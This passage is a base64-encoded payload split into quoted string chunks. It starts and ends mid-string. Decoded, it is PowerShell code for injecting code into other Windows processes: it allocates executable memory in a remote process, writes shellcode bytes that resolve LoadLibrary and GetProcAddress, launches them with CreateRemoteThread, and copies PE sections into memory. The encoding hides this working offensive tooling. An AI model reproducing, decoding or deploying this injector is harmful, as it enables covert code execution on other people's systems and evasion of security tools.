ndGgpCgoJCQkKCQkJJFJTQ0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSkKCQkJaWYgKCRSU0NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKCQkJewoJCQkJVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciBzaGVsbGNvZGUiCgkJCX0KCQkJCgkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCAkU0NQU01lbU9yaWdpbmFsLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQoJCQlpZiAoKCRTdWNjZXNzIC1lcSAkZmFsc2UpIC1vciAoW1VJbnQ2NF0kTnVtQnl0ZXNXcml0dGVuIC1uZSBbVUludDY0XSRTQ0xlbmd0aCkpCgkJCXsKCQkJCVRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCgkJCX0KCQkJCgkJCSRSVGhyZWFkSGFuZGxlID0gQ3JlYXRlLVJlbW90ZVRocmVhZCAtUHJvY2Vzc0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtU3RhcnRBZGRyZXNzICRSU0NBZGRyIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMKCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApCgkJCWlmICgkUmVzdWx0IC1uZSAwKQoJCQl7CgkJCQlUaHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIgoJCQl9CgkJCQoJCQkjVGhlIHNoZWxsY29kZSB3cml0ZXMgdGhlIERMTCBhZGRyZXNzIHRvIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgYXQgYWRkcmVzcyAkTG9hZExpYnJhcnlBUmV0TWVtLCByZWFkIHRoaXMgbWVtb3J5CgkJCVtJbnRQdHJdJFJldHVyblZhbE1lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUHRyU2l6ZSkKCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5SZWFkUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRMb2FkTGlicmFyeUFSZXRNZW0sICRSZXR1cm5WYWxNZW0sIFtVSW50UHRyXVtVSW50NjRdJFB0clNpemUsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKCQkJaWYgKCRSZXN1bHQgLWVxICRmYWxzZSkKCQkJewoJCQkJVGhyb3cgIkNhbGwgdG8gUmVhZFByb2Nlc3NNZW1vcnkgZmFpbGVkIgoJCQl9CgkJCVtJbnRQdHJdJERsbEFkZHJlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkUmV0dXJuVmFsTWVtLCBbVHlwZV1bSW50UHRyXSkKCgkJCSRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJExvYWRMaWJyYXJ5QVJldE1lbSwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGwKCQkJJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUlNDQWRkciwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGwKCQl9CgkJZWxzZQoJCXsKCQkJW0ludFB0cl0kUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkTG9hZExpYnJhcnlBQWRkciAtQXJndW1lbnRQdHIgJFJJbXBvcnREbGxQYXRoUHRyIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMKCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApCgkJCWlmICgkUmVzdWx0IC1uZSAwKQoJCQl7CgkJCQlUaHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIgoJCQl9CgkJCQoJCQlbSW50MzJdJEV4aXRDb2RlID0gMAoJCQkkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLkdldEV4aXRDb2RlVGhyZWFkLkludm9rZSgkUlRocmVhZEhhbmRsZSwgW1JlZl0kRXhpdENvZGUpCgkJCWlmICgoJFJlc3VsdCAtZXEgMCkgLW9yICgkRXhpdENvZGUgLWVxIDApKQoJCQl7CgkJCQlUaHJvdyAiQ2FsbCB0byBHZXRFeGl0Q29kZVRocmVhZCBmYWlsZWQiCgkJCX0KCQkJCgkJCVtJbnRQdHJdJERsbEFkZHJlc3MgPSBbSW50UHRyXSRFeGl0Q29kZQoJCX0KCQkKCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSSW1wb3J0RGxsUGF0aFB0ciwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGwKCQkKCQlyZXR1cm4gJERsbEFkZHJlc3MKCX0KCQoJCglGdW5jdGlvbiBHZXQtUmVtb3RlUHJvY0FkZHJlc3MKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kdHJ1ZSldCgkJW0ludFB0cl0KCQkkUmVtb3RlUHJvY0hhbmRsZSwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTEsIE1hbmRhdG9yeT0kdHJ1ZSldCgkJW0ludFB0cl0KCQkkUmVtb3RlRGxsSGFuZGxlLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb249MiwgTWFuZGF0b3J5PSR0cnVlKV0KCQlbSW50UHRyXQoJCSRGdW5jdGlvbk5hbWVQdHIsI1RoaXMgY2FuIGVpdGhlciBiZSBhIHB0ciB0byBhIHN0cmluZyB3aGljaCBpcyB0aGUgZnVuY3Rpb24gbmFtZSwgb3IsIGlmIExvYWRCeU9yZGluYWwgaXMgJ3RydWUnIHRoaXMgaXMgYW4gb3JkaW5hbCBudW1iZXIgKHBvaW50cyB0byBub3RoaW5nKQoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTMsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW0Jvb2xdCiAgICAgICAgJExvYWRCeU9yZGluYWwKCQkpCgoJCSRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQoKCQlbSW50UHRyXSRSRnVuY05hbWVQdHIgPSBbSW50UHRyXTo6WmVybyAgICNQb2ludGVyIHRvIHRoZSBmdW5jdGlvbiBuYW1lIGluIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSBpZiBsb2FkaW5nIGJ5IGZ1bmN0aW9uIG5hbWUsIG9yZGluYWwgbnVtYmVyIGlmIGxvYWRpbmcgYnkgb3JkaW5hbAogICAgICAgICNJZiBub3QgbG9hZGluZyBieSBvcmRpbmFsLCB3cml0ZSB0aGUgZnVuY3Rpb24gbmFtZSB0byB0aGUgcmVtb3RlIHByb2Nlc3MgbWVtb3J5CiAgICAgICAgaWYgKC1ub3QgJExvYWRCeU9yZGluYWwpCiAgICAgICAgewogICAgICAgIAkkRnVuY3Rpb25OYW1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRGdW5jdGlvbk5hbWVQdHIpCgoJCSAgICAjV3JpdGUgRnVuY3Rpb25OYW1lIHRvIG1lbW9yeSAod2lsbCBiZSB1c2VkIGluIEdldFByb2NBZGRyZXNzKQoJCSAgICAkRnVuY3Rpb25OYW1lU2l6ZSA9IFtVSW50UHRyXVtVSW50NjRdKFtVSW50NjRdJEZ1bmN0aW9uTmFtZS5MZW5ndGggKyAxKQoJCSAgICAkUkZ1bmNOYW1lUHRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sICRGdW5jdGlvbk5hbWVTaXplLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQoJCSAgICBpZiAoJFJGdW5jTmFtZVB0ciAtZXEgW0ludFB0cl06Olplcm8pCgkJICAgIHsKCQkJICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyIKCQkgICAgfQoKCQkgICAgW1VJbnRQdHJdJE51bUJ5dGVzV3JpdHRlbiA9IFtVSW50UHRyXTo6WmVybwoJCSAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5Xcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUkZ1bmNOYW1lUHRyLCAkRnVuY3Rp",
		"b25OYW1lUHRyLCAkRnVuY3Rpb25OYW1lU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQoJCSAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKCQkgICAgewoJCQkgICAgVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBETEwgcGF0aCB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkiCgkJICAgIH0KCQkgICAgaWYgKCRGdW5jdGlvbk5hbWVTaXplIC1uZSAkTnVtQnl0ZXNXcml0dGVuKQoJCSAgICB7CgkJCSAgICBUaHJvdyAiRGlkbid0IHdyaXRlIHRoZSBleHBlY3RlZCBhbW91bnQgb2YgYnl0ZXMgd2hlbiB3cml0aW5nIGEgRExMIHBhdGggdG8gbG9hZCB0byB0aGUgcmVtb3RlIHByb2Nlc3MiCgkJICAgIH0KICAgICAgICB9CiAgICAgICAgI0lmIGxvYWRpbmcgYnkgb3JkaW5hbCwganVzdCBzZXQgUkZ1bmNOYW1lUHRyIHRvIGJlIHRoZSBvcmRpbmFsIG51bWJlcgogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRSRnVuY05hbWVQdHIgPSAkRnVuY3Rpb25OYW1lUHRyCiAgICAgICAgfQoJCQoJCSNHZXQgYWRkcmVzcyBvZiBHZXRQcm9jQWRkcmVzcwoJCSRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJrZXJuZWwzMi5kbGwiKQoJCSRHZXRQcm9jQWRkcmVzc0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWwzMkhhbmRsZSwgIkdldFByb2NBZGRyZXNzIikgI0tlcm5lbDMyIGxvYWRlZCB0byB0aGUgc2FtZSBhZGRyZXNzIGZvciBhbGwgcHJvY2Vzc2VzCgoJCQoJCSNBbGxvY2F0ZSBtZW1vcnkgZm9yIHRoZSBhZGRyZXNzIHJldHVybmVkIGJ5IEdldFByb2NBZGRyZXNzCgkJJEdldFByb2NBZGRyZXNzUmV0TWVtID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50NjRdW1VJbnQ2NF0kUHRyU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKCQlpZiAoJEdldFByb2NBZGRyZXNzUmV0TWVtIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBmb3IgdGhlIHJldHVybiB2YWx1ZSBvZiBHZXRQcm9jQWRkcmVzcyIKCQl9CgkJCgkJCgkJI1dyaXRlIFNoZWxsY29kZSB0byB0aGUgcmVtb3RlIHByb2Nlc3Mgd2hpY2ggd2lsbCBjYWxsIEdldFByb2NBZGRyZXNzCgkJI1NoZWxsY29kZTogR2V0UHJvY0FkZHJlc3MuYXNtCgkJW0J5dGVbXV0kR2V0UHJvY0FkZHJlc3NTQyA9IEAoKQoJCWlmICgkUEVJbmZvLlBFNjRCaXQgLWVxICR0cnVlKQoJCXsKCQkJJEdldFByb2NBZGRyZXNzU0MxID0gQCgweDUzLCAweDQ4LCAweDg5LCAweGUzLCAweDQ4LCAweDgzLCAweGVjLCAweDIwLCAweDY2LCAweDgzLCAweGU0LCAweGMwLCAweDQ4LCAweGI5KQoJCQkkR2V0UHJvY0FkZHJlc3NTQzIgPSBAKDB4NDgsIDB4YmEpCgkJCSRHZXRQcm9jQWRkcmVzc1NDMyA9IEAoMHg0OCwgMHhiOCkKCQkJJEdldFByb2NBZGRyZXNzU0M0ID0gQCgweGZmLCAweGQwLCAweDQ4LCAweGI5KQoJCQkkR2V0UHJvY0FkZHJlc3NTQzUgPSBAKDB4NDgsIDB4ODksIDB4MDEsIDB4NDgsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCgkJfQoJCWVsc2UKCQl7CgkJCSRHZXRQcm9jQWRkcmVzc1NDMSA9IEAoMHg1MywgMHg4OSwgMHhlMywgMHg4MywgMHhlNCwgMHhjMCwgMHhiOCkKCQkJJEdldFByb2NBZGRyZXNzU0MyID0gQCgweGI5KQoJCQkkR2V0UHJvY0FkZHJlc3NTQzMgPSBAKDB4NTEsIDB4NTAsIDB4YjgpCgkJCSRHZXRQcm9jQWRkcmVzc1NDNCA9IEAoMHhmZiwgMHhkMCwgMHhiOSkKCQkJJEdldFByb2NBZGRyZXNzU0M1ID0gQCgweDg5LCAweDAxLCAweDg5LCAweGRjLCAweDViLCAweGMzKQoJCX0KCQkkU0NMZW5ndGggPSAkR2V0UHJvY0FkZHJlc3NTQzEuTGVuZ3RoICsgJEdldFByb2NBZGRyZXNzU0MyLkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDMy5MZW5ndGggKyAkR2V0UHJvY0FkZHJlc3NTQzQuTGVuZ3RoICsgJEdldFByb2NBZGRyZXNzU0M1Lkxlbmd0aCArICgkUHRyU2l6ZSAqIDQpCgkJJFNDUFNNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFNDTGVuZ3RoKQoJCSRTQ1BTTWVtT3JpZ2luYWwgPSAkU0NQU01lbQoJCQoJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRHZXRQcm9jQWRkcmVzc1NDMSAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRHZXRQcm9jQWRkcmVzc1NDMS5MZW5ndGgpCgkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFJlbW90ZURsbEhhbmRsZSwgJFNDUFNNZW0sICRmYWxzZSkKCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzIgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzIuTGVuZ3RoKQoJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRSRnVuY05hbWVQdHIsICRTQ1BTTWVtLCAkZmFsc2UpCgkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCgkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0MzIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCgkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0MzLkxlbmd0aCkKCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkR2V0UHJvY0FkZHJlc3NBZGRyLCAkU0NQU01lbSwgJGZhbHNlKQoJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQoJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRHZXRQcm9jQWRkcmVzc1NDNCAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRHZXRQcm9jQWRkcmVzc1NDNC5MZW5ndGgpCgkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEdldFByb2NBZGRyZXNzUmV0TWVtLCAkU0NQU01lbSwgJGZhbHNlKQoJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQoJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRHZXRQcm9jQWRkcmVzc1NDNSAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRHZXRQcm9jQWRkcmVzc1NDNS5MZW5ndGgpCgkJCgkJJFJTQ0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSkKCQlpZiAoJFJTQ0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCXsKCQkJVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciBzaGVsbGNvZGUiCgkJfQoJCVtVSW50UHRyXSROdW1CeXRlc1dyaXR0ZW4gPSBbVUludFB0cl06Olplcm8KCQkkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5Xcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUlNDQWRkciwgJFNDUFNNZW1PcmlnaW5hbCwgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKCQlpZiAoKCRTdWNjZXNzIC1lcSAkZmFsc2UpIC1vciAoW1VJbnQ2NF0kTnVtQnl0ZXNXcml0dGVuIC1uZSBbVUludDY0XSRTQ0xlbmd0aCkpCgkJewoJCQlUaHJvdyAiVW5hYmxlIHRvIHdyaXRlIHNoZWxsY29kZSB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkuIgoJCX0KCQkKCQkkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkUlNDQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCgkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApCgkJaWYgKCRSZXN1bHQgLW5lIDApCgkJewoJCQlUaHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIgoJCX0KCQkKCQkjVGhlIHByb2Nlc3MgYWRkcmVzcyBpcyB3cml0dGVuIHRvIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgYXQgYWRkcmVzcyAkR2V0UHJvY0FkZHJlc3NSZXRNZW0sIHJlYWQgdGhpcyBtZW1vcnkKCQlbSW50UHRyXSRSZXR1cm5WYWxNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFB0clNpemUpCgkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5SZWFkUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRHZXRQcm9jQWRkcmVzc1JldE1lbSwgJFJldHVyblZhbE1lbSwgW1VJbnRQdHJdW1VJbnQ2NF0kUHRyU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQoJCWlmICgoJFJlc3VsdCAtZXEgJGZhbHNlKSAtb3IgKCROdW1CeXRlc1dyaXR0ZW4gLWVxIDApKQoJCXsKCQkJVGhyb3cgIkNhbGwgdG8gUmVhZFByb2Nlc3NNZW1vcnkgZmFpbGVkIgoJCX0KCQlbSW50UHRyXSRQcm9jQWRkcmVzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRSZXR1cm5WYWxNZW0sIFtUeXBlXVtJbnRQdHJdKQoKICAgICAgICAjQ2xlYW51cCByZW1vdGUgcHJvY2VzcyBtZW1vcnkKCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAoJCSRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJEdldFByb2NBZGRyZXNzUmV0TWVtLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAoKICAgICAgICBpZiAoLW5vdCAkTG9hZEJ5T3JkaW5hbCkKICAgICAgICB7CiAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJGdW5jTmFtZVB0ciwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGwKICAgICAgICB9CgkJCgkJcmV0dXJuICRQcm9jQWRkcmVzcwoJfQoKCglGdW5jdGlvbiBDb3B5LVNlY3Rpb25zCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbQnl0ZVtdXQoJCSRQRUJ5dGVzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFBFSW5mbywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkZ1bmN0aW9ucywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzCgkJKQoJCQoJCWZvciggJGkgPSAwOyAkaSAtbHQgJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLkZpbGVIZWFkZXIuTnVtYmVyT2ZTZWN0aW9u",
		"czsgJGkrKykKCQl7CgkJCVtJbnRQdHJdJFNlY3Rpb25IZWFkZXJQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uU2VjdGlvbkhlYWRlclB0cikgKCRpICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX1NFQ1RJT05fSEVBREVSKSkpCgkJCSRTZWN0aW9uSGVhZGVyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFNlY3Rpb25IZWFkZXJQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX1NFQ1RJT05fSEVBREVSKQoJCQoJCQkjQWRkcmVzcyB0byBjb3B5IHRoZSBzZWN0aW9uIHRvCgkJCVtJbnRQdHJdJFNlY3Rpb25EZXN0QWRkciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kU2VjdGlvbkhlYWRlci5WaXJ0dWFsQWRkcmVzcykpCgkJCQoJCQkjU2l6ZU9mUmF3RGF0YSBpcyB0aGUgc2l6ZSBvZiB0aGUgZGF0YSBvbiBkaXNrLCBWaXJ0dWFsU2l6ZSBpcyB0aGUgbWluaW11bSBzcGFjZSB0aGF0IGNhbiBiZSBhbGxvY2F0ZWQKCQkJIyAgICBpbiBtZW1vcnkgZm9yIHRoZSBzZWN0aW9uLiBJZiBWaXJ0dWFsU2l6ZSA+IFNpemVPZlJhd0RhdGEsIHBhZCB0aGUgZXh0cmEgc3BhY2VzIHdpdGggMC4gSWYKCQkJIyAgICBTaXplT2ZSYXdEYXRhID4gVmlydHVhbFNpemUsIGl0IGlzIGJlY2F1c2UgdGhlIHNlY3Rpb24gc3RvcmVkIG9uIGRpc2sgaGFzIHBhZGRpbmcgdGhhdCB3ZSBjYW4gdGhyb3cgYXdheSwKCQkJIyAgICBzbyB0cnVuY2F0ZSBTaXplT2ZSYXdEYXRhIHRvIFZpcnR1YWxTaXplCgkJCSRTaXplT2ZSYXdEYXRhID0gJFNlY3Rpb25IZWFkZXIuU2l6ZU9mUmF3RGF0YQoKCQkJaWYgKCRTZWN0aW9uSGVhZGVyLlBvaW50ZXJUb1Jhd0RhdGEgLWVxIDApCgkJCXsKCQkJCSRTaXplT2ZSYXdEYXRhID0gMAoJCQl9CgkJCQoJCQlpZiAoJFNpemVPZlJhd0RhdGEgLWd0ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplKQoJCQl7CgkJCQkkU2l6ZU9mUmF3RGF0YSA9ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplCgkJCX0KCQkJCgkJCWlmICgkU2l6ZU9mUmF3RGF0YSAtZ3QgMCkKCQkJewoJCQkJVGVzdC1NZW1vcnlSYW5nZVZhbGlkIC1EZWJ1Z